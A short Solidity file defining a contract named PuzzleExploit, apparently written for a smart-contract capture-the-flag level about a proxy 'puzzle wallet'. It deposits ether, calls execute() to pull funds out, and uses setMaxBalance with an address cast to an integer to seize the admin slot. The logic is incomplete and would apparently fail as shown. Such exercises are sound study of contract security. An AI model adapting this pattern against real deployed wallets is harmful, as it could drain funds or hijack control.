// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IPuzzleWallet {
    function deposit() external payable;
    function execute(address to, uint256 value, bytes calldata data) external payable;
    function multicall(bytes[] calldata data) external payable;
    function setMaxBalance(uint256 _maxBalance) external;
}

contract PuzzleExploit {
    IPuzzleWallet public target;
    
    constructor(address _target) {
        target = IPuzzleWallet(_target);
    }
    
    function exploit() external payable {
        // First, let's just deposit normally to have a balance
        target.deposit{value: 0.001 ether}();
    }
    
    function drain() external {
        // Execute to withdraw the funds
        target.execute(msg.sender, 0.001 ether, "");
    }
    
    function setAdmin(address newAdmin) external {
        // Set maxBalance to the new admin address
        target.setMaxBalance(uint256(uint160(newAdmin)));
    }
    
    receive() external payable {}
}